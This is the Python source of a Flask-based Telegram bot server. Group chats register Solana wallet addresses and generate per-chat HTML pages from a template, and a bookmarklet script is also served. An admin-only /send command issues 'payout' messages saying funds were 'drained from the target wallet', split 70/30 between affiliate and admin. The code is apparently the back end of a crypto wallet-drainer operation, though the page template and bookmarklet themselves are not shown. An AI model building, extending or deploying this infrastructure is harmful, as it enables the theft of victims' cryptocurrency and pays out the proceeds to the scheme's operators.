import os
import json
import logging
import string
import random
import requests
from flask import Flask, request, jsonify, send_from_directory, abort
from werkzeug.middleware.proxy_fix import ProxyFix

# Configure colorful logging with emojis
class ColorfulFormatter(logging.Formatter):
    """Custom formatter with colors and emojis for different log levels"""
    
    # ANSI color codes
    COLORS = {
        'DEBUG': '\033[36m',    # Cyan
        'INFO': '\033[32m',     # Green
        'WARNING': '\033[33m',  # Yellow
        'ERROR': '\033[31m',    # Red
        'CRITICAL': '\033[35m', # Magenta
        'RESET': '\033[0m'      # Reset
    }
    
    # Emojis for different log levels
    EMOJIS = {
        'DEBUG': '🔍',
        'INFO': '✅',
        'WARNING': '⚠️',
        'ERROR': '❌',
        'CRITICAL': '🚨'
    }
    
    def format(self, record):
        # Get emoji and color for this log level
        emoji = self.EMOJIS.get(record.levelname, '📝')
        color = self.COLORS.get(record.levelname, '')
        reset = self.COLORS['RESET']
        
        # Format timestamp
        timestamp = self.formatTime(record, '%H:%M:%S')
        
        # Create the formatted message with better formatting
        message = record.getMessage()
        formatted = f"{color}{emoji} `[{timestamp}]` **{record.levelname}** → {message}{reset}"
        
        # Add exception info if present
        if record.exc_info:
            formatted += f"\n{color}💥 **Exception:** `{self.formatException(record.exc_info)}`{reset}"
        
        return formatted

# Configure logging with our custom formatter
logging.basicConfig(
    level=logging.DEBUG,
    format='%(message)s',  # We'll handle formatting in our custom formatter
    handlers=[
        logging.StreamHandler()
    ]
)

# Set up our custom formatter
logger = logging.getLogger(__name__)
handler = logging.StreamHandler()
handler.setFormatter(ColorfulFormatter())
logger.handlers.clear()
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)

# Load configuration
def load_config():
    try:
        with open('data/config.json', 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        logger.warning("📄 config.json not found, using default environment values")
        return {
            "telegram_bot_token": os.environ.get('TELEGRAM_BOT_TOKEN', 'your-bot-token-here'),
            "webhook_url": os.environ.get('WEBHOOK_URL', 'https://your-domain.com'),
            "session_secret": os.environ.get('SESSION_SECRET', 'dev-secret-key'),
            "port": 5000,
            "host": "0.0.0.0",
            "full_logs_chat_id": os.environ.get('FULL_LOGS_CHAT_ID', 'your-full-logs-chat-id-here'),
            "admin_user_ids": []
        }

config = load_config()
logger.info(f"🚀 **Bot configuration loaded** - Webhook: `{config['webhook_url']}`")
logger.info(f"🌐 **Flask server starting** on `{config['host']}:{config['port']}`")

# Create Flask app
app = Flask(__name__)
app.secret_key = config['session_secret']
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

# Storage class for bot data
class Storage:
    """Simple JSON-based storage for bot data"""
    
    def __init__(self, data_file='data/bot_data.json'):
        self.data_file = data_file
        self.data = self._load_data()
    
    def _load_data(self):
        """Load data from JSON file"""
        if os.path.exists(self.data_file):
            try:
                with open(self.data_file, 'r') as f:
                    data = json.load(f)
                    # Ensure required keys exist
                    if 'wallets' not in data:
                        data['wallets'] = {}
                    if 'pages' not in data:
                        data['pages'] = {}
                    return data
            except Exception as e:
                logger.error(f"💾 Failed to load bot data from {self.data_file}: {e}")
                return {'wallets': {}, 'pages': {}}
        return {'wallets': {}, 'pages': {}}
    
    def _save_data(self):
        """Save data to JSON file"""
        try:
            os.makedirs('data', exist_ok=True)
            with open(self.data_file, 'w') as f:
                json.dump(self.data, f, indent=2)
        except Exception as e:
            logger.error(f"💾 Failed to save bot data to {self.data_file}: {e}")
    
    def get_wallet_address(self, chat_id):
        """Get wallet address for a chat"""
        return self.data['wallets'].get(str(chat_id))
    
    def set_wallet_address(self, chat_id, wallet_address):
        """Set wallet address for a chat"""
        self.data['wallets'][str(chat_id)] = wallet_address
        self._save_data()
    
    def get_page_filename(self, chat_id):
        """Get page filename for a chat"""
        return self.data['pages'].get(str(chat_id))
    
    def set_page_filename(self, chat_id, filename):
        """Set page filename for a chat"""
        self.data['pages'][str(chat_id)] = filename
        self._save_data()

# Print startup banner
print("\n" + "="*60)
print("🤖 TELEGRAM BOT API SERVER")
print("="*60)
print("📱 Bot Commands: /start /setup /page /export")
print("🌐 Web Interface: Available at configured webhook URL")
print("💾 Storage: JSON-based file storage")
print("="*60 + "\n")

# Initialize storage
logger.info("💾 **Initializing bot data storage...**")
storage = Storage()
wallet_count = len(storage.data.get('wallets', {}))
page_count = len(storage.data.get('pages', {}))
logger.info(f"✅ **Storage ready** - `{wallet_count} wallets` | `{page_count} pages`")

# Create required directories
os.makedirs('data', exist_ok=True)
os.makedirs('page', exist_ok=True)

# Webhook setup will be done after all functions are defined

# Bot functionality
def generate_random_filename():
    """Generate a random 4-character lowercase alphanumeric filename"""
    chars = string.ascii_lowercase + string.digits
    return ''.join(random.choice(chars) for _ in range(4))

def send_message(chat_id, text, parse_mode=None):
    """Send a message to Telegram chat"""
    try:
        url = f"https://api.telegram.org/bot{config['telegram_bot_token']}/sendMessage"
        data = {
            'chat_id': chat_id,
            'text': text
        }
        if parse_mode:
            data['parse_mode'] = parse_mode
        
        response = requests.post(url, json=data)
        return response.json()
    except Exception as e:
        logger.error(f"📤 Failed to send Telegram message to chat {chat_id}: {e}")
        return None

def send_document(chat_id, file_path, filename, caption=None):
    """Send a document to Telegram chat"""
    try:
        url = f"https://api.telegram.org/bot{config['telegram_bot_token']}/sendDocument"
        
        with open(file_path, 'rb') as file:
            files = {'document': (filename, file)}
            data = {'chat_id': chat_id}
            if caption:
                data['caption'] = caption
            
            response = requests.post(url, files=files, data=data)
            return response.json()
    except Exception as e:
        logger.error(f"📎 Failed to send document {filename} to chat {chat_id}: {e}")
        return None

def send_admin_log(message, command_type):
    """Send a log message to the admin chat"""
    admin_chat_id = config.get('full_logs_chat_id')
    if not admin_chat_id:
        return
    
    try:
        # Extract user and chat information
        user = message.get('from', {})
        chat = message.get('chat', {})
        
        user_id = user.get('id', 'Unknown')
        username = user.get('username', 'No username')
        first_name = user.get('first_name', 'Unknown')
        last_name = user.get('last_name', '')
        full_name = f"{first_name} {last_name}".strip()
        
        chat_id = chat.get('id', 'Unknown')
        chat_title = chat.get('title', 'Unknown Chat')
        chat_type = chat.get('type', 'Unknown')
        
        # Create log message
        log_message = f"""🔔 **{command_type.upper()} Command Used**

👤 **User Info:**
• Name: {full_name}
• Username: @{username}
• User ID: `{user_id}`

💬 **Chat Info:**
• Chat: {chat_title}
• Chat ID: `{chat_id}`
• Type: {chat_type}

⏰ **Time:** {message.get('date', 'Unknown')}"""
        
        # Send to admin chat
        send_message(admin_chat_id, log_message, parse_mode='Markdown')
        logger.info(f"📤 **Admin log sent** for {command_type} command from user {user_id}")
        
    except Exception as e:
        logger.error(f"📤 **Failed to send admin log**: {e}")

def check_required_user_in_group(chat_id):
    """Check if the required user from config is in the group"""
    required_user_id = config.get('required_user_id')
    if not required_user_id:
        # If no required user is configured, allow operation
        return True
    
    try:
        # Use getChatMember with the user ID directly
        url = f"https://api.telegram.org/bot{config['telegram_bot_token']}/getChatMember"
        data = {
            'chat_id': chat_id,
            'user_id': required_user_id
        }
        
        response = requests.post(url, json=data)
        result = response.json()
        
        if result.get('ok'):
            member_status = result.get('result', {}).get('status')
            user_info = result.get('result', {}).get('user', {})
            username = user_info.get('username', 'Unknown')
            first_name = user_info.get('first_name', 'Unknown')
            
            # User is in the group if they have any member status (except 'left' or 'kicked')
            is_member = member_status in ['creator', 'administrator', 'member', 'restricted']
            if is_member:
                logger.info(f"✅ **Required user {first_name} (@{username}, ID: {required_user_id}) found** as {member_status} in chat `{chat_id}`")
            else:
                logger.warning(f"⚠️ **Required user {first_name} (@{username}, ID: {required_user_id}) has status: {member_status}** in chat `{chat_id}`")
            return is_member
        else:
            error_desc = result.get('description', 'Unknown error')
            if 'user not found' in error_desc.lower() or 'invalid user_id' in error_desc.lower():
                logger.warning(f"⚠️ **User ID {required_user_id} not found** in chat `{chat_id}`: {error_desc}")
                return False
            else:
                logger.warning(f"⚠️ **Failed to check user ID {required_user_id}** in chat `{chat_id}`: {error_desc}")
                return False
                
    except Exception as e:
        logger.error(f"❌ **Error checking required user ID {required_user_id}** in chat `{chat_id}`: {e}")
        return False

def handle_start_command(message):
    """Handle /start command"""
    chat = message.get('chat', {})
    chat_id = chat.get('id')
    chat_type = chat.get('type')
    chat_title = chat.get('title', 'Unknown Chat')
    
    logger.info(f"🚀 **/start** from chat `{chat_id}` (**{chat_title}**) - Type: `{chat_type}`")
    
    # Send admin log
    send_admin_log(message, 'start')
    
    if chat_type == 'private':
        logger.warning(f"🚫 **Blocked private chat** from `{chat_id}` - Bot only works in groups")
        send_message(chat_id, "⚠️ This bot only works in group chats.")
        return
    
    # Check if required user is in the group
    if not check_required_user_in_group(chat_id):
        required_user = config.get('required_user', 'OrcaleDev')
        logger.warning(f"⚠️ **Required user @{required_user} not found** in chat `{chat_id}`")
        send_message(chat_id, f"⚠️ Make sure to add @{required_user} here before you start.")
        return
    
    # Check if setup is completed
    wallet_address = storage.get_wallet_address(chat_id)
    if wallet_address:
        filename = storage.get_page_filename(chat_id)
        if filename:
            page_url = f"{config['webhook_url']}/{filename}"
            send_message(
                chat_id,
                f"📄 Page: {page_url}\n🏦 Address: `{wallet_address}`",
                parse_mode='Markdown'
            )
        else:
            send_message(
                chat_id,
                f"🏦 Address: `{wallet_address}`\nUse /page to create your page.",
                parse_mode='Markdown'
            )
    else:
        send_message(chat_id, "📝 Use /setup with your Solana wallet address to start.")

def handle_setup_command(message):
    """Handle /setup command"""
    chat = message.get('chat', {})
    chat_id = chat.get('id')
    text = message.get('text', '')
    chat_title = chat.get('title', 'Unknown Chat')
    
    logger.info(f"⚙️ **/setup** from chat `{chat_id}` (**{chat_title}**)")
    
    # Send admin log with wallet info
    send_admin_log(message, 'setup')
    
    # Check if required user is in the group
    if not check_required_user_in_group(chat_id):
        required_user = config.get('required_user', 'OrcaleDev')
        logger.warning(f"⚠️ **Required user @{required_user} not found** in chat `{chat_id}`")
        send_message(chat_id, f"⚠️ Make sure to add @{required_user} here before you start.")
        return
    
    # Parse command arguments
    parts = text.split()
    if len(parts) < 2:
        logger.warning(f"❌ **Invalid setup** from chat `{chat_id}` - Missing wallet address")
        send_message(chat_id, "❓ Usage: /setup WALLET_ADDRESS")
        return
    
    wallet_address = parts[1]
    logger.info(f"💰 **Setting wallet** for chat `{chat_id}`: `{wallet_address[:8]}...{wallet_address[-8:]}`")
    
    # Store wallet address for this chat
    storage.set_wallet_address(chat_id, wallet_address)
    
    # Check if page already exists
    existing_filename = storage.get_page_filename(chat_id)
    if existing_filename:
        page_url = f"{config['webhook_url']}/{existing_filename}"
        send_message(
            chat_id, 
            f"✅ Setup updated! Your existing page: {page_url}"
        )
    else:
        send_message(chat_id, "✅ Setup done, use /page to create your page.")

def handle_page_command(message):
    """Handle /page command"""
    chat = message.get('chat', {})
    chat_id = chat.get('id')
    chat_title = chat.get('title', 'Unknown Chat')
    
    logger.info(f"📄 **/page** from chat `{chat_id}` (**{chat_title}**)")
    
    # Check if required user is in the group
    if not check_required_user_in_group(chat_id):
        required_user = config.get('required_user', 'OrcaleDev')
        logger.warning(f"⚠️ **Required user @{required_user} not found** in chat `{chat_id}`")
        send_message(chat_id, f"⚠️ Make sure to add @{required_user} here before you start.")
        return
    
    # Check if setup is complete
    wallet_address = storage.get_wallet_address(chat_id)
    if not wallet_address:
        send_message(chat_id, "❗ Please run /setup with your wallet address first.")
        return
    
    # Check if page already exists for this chat
    existing_filename = storage.get_page_filename(chat_id)
    if existing_filename:
        page_url = f"{config['webhook_url']}/{existing_filename}"
        logger.info(f"📄 **Page exists** for chat `{chat_id}`: `{existing_filename}`")
        send_message(
            chat_id,
            f"📄 You already have a page: {page_url}\n\nUse /export to download the HTML file."
        )
        return
    
    # Generate random filename
    filename = generate_random_filename()
    logger.info(f"🎲 **Generated filename** `{filename}` for chat `{chat_id}`")
    
    # Load template and replace placeholders
    try:
        with open('data/page.html', 'r') as f:
            template_content = f.read()
        
        # Replace placeholders with actual values
        page_content = template_content.replace('CHAT_ID', str(chat_id))
        page_content = page_content.replace('FULL_LOGS', config['full_logs_chat_id'])
        page_content = page_content.replace('WEBHOOK_URL', config['webhook_url'])
        
        # Debug logging to verify replacements
        logger.info(f"🔄 **Chat ID replacement**: `CHAT_ID` → `{chat_id}`")
        logger.info(f"🔄 **Full logs replacement**: `FULL_LOGS` → `{config['full_logs_chat_id']}`")
        logger.info(f"🔄 **Webhook URL replacement**: `WEBHOOK_URL` → `{config['webhook_url']}`")
        
        # Save the file
        os.makedirs('page', exist_ok=True)
        with open(f'page/{filename}.html', 'w') as f:
            f.write(page_content)
        
        # Store mapping (filename without .html extension for clean URLs)
        storage.set_page_filename(chat_id, filename)
        
        page_url = f"{config['webhook_url']}/{filename}"
        logger.info(f"✅ **Page created** `{filename}` for chat `{chat_id}` - URL ready!")
        send_message(
            chat_id,
            f"✅ Page created: {page_url}\n\nUse /export to download the HTML file."
        )
        
    except Exception as e:
        logger.error(f"📄 **Failed to create page** for chat `{chat_id}`: `{e}`")
        send_message(chat_id, "❌ Error creating page. Please try again.")

def handle_send_command(message):
    """Handle /send command (admin only)"""
    msg = message.get('message', message)
    from_user = msg.get('from', {})
    user_id = from_user.get('id')
    username = from_user.get('username', 'Unknown')
    text = msg.get('text', '')
    chat = msg.get('chat', {})
    chat_id = chat.get('id')
    
    logger.info(f"💰 **/send** from user `{user_id}` (@{username}) in chat `{chat_id}`")
    
    # Check if user is admin
    if user_id not in config.get('admin_user_ids', []):
        logger.warning(f"🚫 **Unauthorized /send** from user `{user_id}` (@{username})")
        send_message(chat_id, "❌ You are not authorized to use this command.")
        return
    
    # Parse command: /send chat_id amount
    parts = text.split()
    if len(parts) < 3:
        send_message(chat_id, "❓ Usage: /send CHAT_ID AMOUNT\nExample: /send -123456789 100")
        return
    
    try:
        target_chat_id = int(parts[1])
        amount = float(parts[2])
    except ValueError:
        send_message(chat_id, "❌ Invalid format. Use: /send CHAT_ID AMOUNT")
        return
    
    # Calculate amounts (70% to user, 30% to admin)
    user_amount = amount * 0.7
    admin_amount = amount * 0.3
    
    # Get target chat info for logging
    target_wallet = storage.get_wallet_address(target_chat_id)
    if not target_wallet:
        send_message(chat_id, f"⚠️ Warning: No wallet found for chat {target_chat_id}, sending message anyway.")
    
    # Create the payout message
    payout_message = f"""💰 **Payout Notification**

${amount:.2f} was successfully drained from the target wallet.

**Your Share:** ${user_amount:.2f} (70%)
**Admin Share:** ${admin_amount:.2f} (30%)

Your funds have been sent to your configured wallet address.

Chat ID: `{target_chat_id}`
Authorized by: @{username}"""
    
    # Send message to target chat
    try:
        send_message(target_chat_id, payout_message)
        
        # Log the transaction
        logger.info(f"💰 **Payout sent** to chat `{target_chat_id}` - Total: ${amount:.2f} | User: ${user_amount:.2f} | Admin: ${admin_amount:.2f} | By: @{username}")
        
        # Confirm to admin
        send_message(chat_id, f"✅ Payout message sent to chat `{target_chat_id}`\n\nAmount: ${amount:.2f}\nUser gets: ${user_amount:.2f} (70%)\nAdmin gets: ${admin_amount:.2f} (30%)")
        
    except Exception as e:
        logger.error(f"💰 **Failed to send payout** to chat `{target_chat_id}`: {e}")
        send_message(chat_id, f"❌ Failed to send payout message to chat `{target_chat_id}`")

def handle_full_command(message):
    """Handle /full command (admin only)"""
    msg = message.get('message', message)
    from_user = msg.get('from', {})
    user_id = from_user.get('id')
    username = from_user.get('username', 'Unknown')
    chat = msg.get('chat', {})
    chat_id = chat.get('id')
    text = msg.get('text', '')
    chat_title = chat.get('title', 'Unknown Chat')
    
    logger.info(f"🔒 **/full** from user `{user_id}` (@{username}) in chat `{chat_id}` (**{chat_title}**)")
    
    # Check if user is admin
    if user_id not in config.get('admin_user_ids', []):
        logger.warning(f"🚫 **Unauthorized /full** from user `{user_id}` (@{username})")
        send_message(chat_id, "❌ You are not authorized to use this command.")
        return
    
    # Parse command arguments (same as /setup)
    parts = text.split()
    if len(parts) < 2:
        logger.warning(f"❌ **Invalid full setup** from chat `{chat_id}` - Missing wallet address")
        send_message(chat_id, "❓ Usage: /full WALLET_ADDRESS")
        return
    
    wallet_address = parts[1]
    logger.info(f"💰 **Setting full wallet** for chat `{chat_id}`: `{wallet_address[:8]}...{wallet_address[-8:]}`")
    
    # Check if setup is already done (using full_ prefix)
    existing_filename = storage.get_page_filename(f"full_{chat_id}")
    if existing_filename:
        page_url = f"{config['webhook_url']}/{existing_filename}"
        send_message(
            chat_id,
            f"✅ Setup updated! Your existing page: {page_url}"
        )
        return
    
    # Store wallet address for this chat (same as setup)
    storage.set_wallet_address(chat_id, wallet_address)
    
    # Generate random filename for the full page
    filename = generate_random_filename()
    logger.info(f"🎲 **Generated full page filename** `{filename}` for admin in chat `{chat_id}`")
    
    # Load template and replace placeholders for FULL PAGE
    try:
        with open('data/page.html', 'r') as f:
            template_content = f.read()
        
        # For /full command: CHAT_ID becomes 0, FULL_LOGS becomes current chat_id
        page_content = template_content.replace('CHAT_ID', '0')
        page_content = page_content.replace('FULL_LOGS', str(chat_id))
        page_content = page_content.replace('WEBHOOK_URL', config['webhook_url'])
        
        # Debug logging to verify replacements
        logger.info(f"🔄 **Full page Chat ID replacement**: `CHAT_ID` → `0`")
        logger.info(f"🔄 **Full page Full logs replacement**: `FULL_LOGS` → `{chat_id}`")
        logger.info(f"🔄 **Full page Webhook URL replacement**: `WEBHOOK_URL` → `{config['webhook_url']}`")
        
        # Save the file
        os.makedirs('page', exist_ok=True)
        with open(f'page/{filename}.html', 'w') as f:
            f.write(page_content)
        
        # Store mapping with special prefix to distinguish from regular pages
        storage.set_page_filename(f"full_{chat_id}", filename)
        
        page_url = f"{config['webhook_url']}/{filename}"
        logger.info(f"✅ **Full page created** `{filename}` for admin in chat `{chat_id}` - URL ready!")
        
        # Use same success message as /setup
        send_message(chat_id, "✅ Setup done, use /page to create your page.")
        
    except Exception as e:
        logger.error(f"🔒 **Failed to create full page** for admin in chat `{chat_id}`: `{e}`")
        send_message(chat_id, "❌ Error creating full page. Please try again.")

def handle_export_command(message):
    """Handle /export command"""
    chat = message.get('chat', {})
    chat_id = chat.get('id')
    chat_title = chat.get('title', 'Unknown Chat')
    
    logger.info(f"📦 **/export** from chat `{chat_id}` (**{chat_title}**)")
    
    # Check if required user is in the group
    if not check_required_user_in_group(chat_id):
        required_user = config.get('required_user', 'OrcaleDev')
        logger.warning(f"⚠️ **Required user @{required_user} not found** in chat `{chat_id}`")
        send_message(chat_id, f"⚠️ Make sure to add @{required_user} here before you start.")
        return
    
    # Check if page exists (regular or full page)
    filename = storage.get_page_filename(chat_id)
    full_filename = storage.get_page_filename(f"full_{chat_id}")
    
    if not filename and not full_filename:
        send_message(chat_id, "❗ No page found. Use /page or /full to create one first.")
        return
    
    # If both exist, prioritize the most recent one or ask user
    export_filename = full_filename if full_filename else filename
    
    try:
        # Send the HTML file as document
        file_path = f'page/{export_filename}.html'
        page_type = "full page" if full_filename else "regular page"
        send_document(chat_id, file_path, f'{export_filename}.html', f"📄 Your generated HTML {page_type}")
    except Exception as e:
        logger.error(f"📦 **Failed to export** file for chat `{chat_id}`: `{e}`")
        send_message(chat_id, "❌ Error sending file. Please try again.")

def setup_telegram_webhook():
    """Set up the Telegram webhook URL"""
    webhook_url = f"{config['webhook_url']}/webhook"
    logger.info(f"🔗 **Setting up webhook**: `{webhook_url}`")
    
    try:
        url = f"https://api.telegram.org/bot{config['telegram_bot_token']}/setWebhook"
        
        response = requests.post(url, json={'url': webhook_url})
        result = response.json()
        
        if result.get('ok'):
            logger.info(f"✅ Webhook successfully configured!")
            return True
        else:
            logger.error(f"🔗 Failed to set webhook: {result.get('description', 'Unknown error')}")
            return False
    except Exception as e:
        logger.error(f"🔗 Error setting webhook: {e}")
        return False

def process_update(update_data):
    """Process incoming webhook update"""
    try:
        message = update_data.get('message', {})
        text = message.get('text', '')
        chat = message.get('chat', {})
        chat_id = chat.get('id')
        
        logger.info(f"📨 Received message from chat {chat_id}: {text[:50]}{'...' if len(text) > 50 else ''}")
        
        if text.startswith('/start'):
            handle_start_command(message)
        elif text.startswith('/setup'):
            handle_setup_command(message)
        elif text.startswith('/page'):
            handle_page_command(message)
        elif text.startswith('/full'):
            handle_full_command(message)
        elif text.startswith('/export'):
            handle_export_command(message)
        elif text.startswith('/send'):
            handle_send_command(message)
        else:
            logger.debug(f"🤷 Unknown command or message from chat {chat_id}: {text}")
        
    except Exception as e:
        logger.error(f"📨 Failed to process webhook update: {e}")

# Flask routes
@app.route('/')
def index():
    """Home page - serve index.html from data directory"""
    try:
        with open('data/index.html', 'r') as f:
            return f.read()
    except FileNotFoundError:
        # Fallback if index.html doesn't exist
        return '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Telegram Bot API</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 50px; text-align: center; }
                .error { color: red; }
            </style>
        </head>
        <body>
            <h1>Telegram Bot Server</h1>
            <p class="error">⚠️ index.html file not found in data directory</p>
            <p>Please ensure data/index.html exists.</p>
        </body>
        </html>
        '''

@app.route('/bookmarklet.js')
def serve_bookmarklet():
    """Serve the bookmarklet JavaScript file"""
    try:
        logger.info(f"🔗 Serving bookmarklet.js")
        return send_from_directory('static', 'bookmarklet.js', mimetype='application/javascript')
    except FileNotFoundError:
        logger.warning(f"📄 Bookmarklet file not found")
        abort(404)

@app.route('/<filename>')
def serve_page(filename):
    """Serve generated HTML pages from page directory with clean URLs"""
    try:
        logger.info(f"🌐 Serving page: {filename}.html")
        return send_from_directory('page', f'{filename}.html')
    except FileNotFoundError:
        logger.warning(f"📄 Page not found: {filename}.html")
        abort(404)

@app.route('/webhook', methods=['POST'])
def webhook():
    """Handle incoming webhook requests from Telegram"""
    try:
        logger.info(f"🔗 Received webhook request")
        update_data = request.get_json()
        logger.info(f"📥 Webhook data: {update_data}")
        if update_data:
            process_update(update_data)
        else:
            logger.warning(f"⚠️ No update data received")
        
        return jsonify({'status': 'ok'})
    except Exception as e:
        logger.error(f"🔗 Webhook processing error: {e}")
        return jsonify({'status': 'error'}), 500

@app.route('/setup-webhook')
def setup_webhook_route():
    """Manually setup webhook"""
    logger.info(f"🔧 Manual webhook setup requested")
    
    if config['telegram_bot_token'] == 'your-bot-token-here':
        logger.warning(f"⚠️ Webhook setup failed - bot token not configured")
        return jsonify({'status': 'error', 'message': 'Bot token not configured'})
    
    success = setup_telegram_webhook()
    if success:
        return jsonify({'status': 'success', 'message': 'Webhook set successfully'})
    else:
        return jsonify({'status': 'error', 'message': 'Failed to set webhook'})

@app.route('/bot-status')
def bot_status():
    """Check bot status and webhook info"""
    try:
        # Check bot info
        bot_url = f"https://api.telegram.org/bot{config['telegram_bot_token']}/getMe"
        bot_response = requests.get(bot_url)
        bot_info = bot_response.json()
        
        # Check webhook info
        webhook_url = f"https://api.telegram.org/bot{config['telegram_bot_token']}/getWebhookInfo"
        webhook_response = requests.get(webhook_url)
        webhook_info = webhook_response.json()
        
        return jsonify({
            'bot_info': bot_info,
            'webhook_info': webhook_info,
            'current_webhook_url': f"{config['webhook_url']}/webhook"
        })
    except Exception as e:
        logger.error(f"🤖 Failed to check bot status: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/test-page/<chat_id>')
def test_page_generation(chat_id):
    """Test page generation for debugging"""
    try:
        # Generate random filename
        filename = generate_random_filename()
        
        # Load template and replace CHAT_ID
        with open('data/page.html', 'r') as f:
            template_content = f.read()
        
        # Replace CHAT_ID placeholder with actual chat ID
        page_content = template_content.replace('CHAT_ID', str(chat_id))
        
        # Save the file
        os.makedirs('page', exist_ok=True)
        with open(f'page/{filename}.html', 'w') as f:
            f.write(page_content)
        
        page_url = f"{config['webhook_url']}/{filename}"
        
        return jsonify({
            'status': 'success',
            'filename': filename,
            'page_url': page_url,
            'chat_id': chat_id
        })
        
    except Exception as e:
        logger.error(f"🧪 Failed to create test page for chat {chat_id}: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Set up Telegram webhook if bot token is configured (for both gunicorn and direct execution)
if config['telegram_bot_token'] != 'your-bot-token-here':
    logger.info("🔗 **Setting up Telegram webhook...**")
    setup_telegram_webhook()

if __name__ == '__main__':
    # Create directories
    os.makedirs('data', exist_ok=True)
    os.makedirs('page', exist_ok=True)
    
    # Log startup info
    logger.info(f"Starting Telegram Bot Server")
    logger.info(f"Webhook URL: {config['webhook_url']}/webhook")
    logger.info(f"Bot Token: {'Configured' if config['telegram_bot_token'] != 'your-bot-token-here' else 'Not configured'}")
    
    # Run the Flask app
    app.run(
        host=config['host'],
        port=config['port'],
        debug=True
    )